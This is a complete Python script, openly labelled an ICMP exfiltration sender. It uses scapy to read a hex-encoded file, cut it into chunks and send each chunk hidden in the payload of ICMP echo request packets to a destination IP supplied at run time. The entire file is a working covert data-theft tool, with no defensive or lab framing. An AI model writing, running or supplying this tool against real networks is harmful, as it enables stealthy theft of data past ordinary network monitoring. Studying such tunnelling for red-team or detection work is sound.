#!/usr/bin/env python3
"""
ICMP exfiltration sender.
Reads a hex-encoded payload file, splits into chunks, and sends as ICMP Echo Request payloads.
"""
import argparse
import os
import sys
from pathlib import Path

try:
    from scapy.all import IP, ICMP, Raw, send
except ImportError:
    print("[-] scapy not installed. Run: pip install scapy", file=sys.stderr)
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="ICMP exfiltration sender")
    parser.add_argument("--hex-file", required=True, help="Path to hex-encoded payload file")
    parser.add_argument("--dest", required=True, help="Destination IP address")
    parser.add_argument("--chunk-size", type=int, default=56, help="Payload chunk size in bytes (default: 56)")
    args = parser.parse_args()

    hex_data = Path(args.hex_file).read_text().strip()
    dest_ip = args.dest
    chunk_size = args.chunk_size

    print("[*] ICMP sender: {}".format(dest_ip))
    print("[*] Total hex length: {} chars".format(len(hex_data)))
    print("[*] Chunk size: {} bytes".format(chunk_size))

    chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]
    print("[*] Sending {} ICMP packets...".format(len(chunks)))

    for seq, chunk in enumerate(chunks, start=1):
        pkt = IP(dst=dest_ip) / ICMP(type=8, code=0, seq=seq) / Raw(load=chunk.encode())
        send(pkt, verbose=False)
        print("    Sent packet {}/{}".format(seq, len(chunks)) + " ({} bytes)".format(len(chunk)), flush=True)

    print("[+] ICMP exfiltration complete: {} packets sent to {}".format(len(chunks), dest_ip))


if __name__ == "__main__":
    main()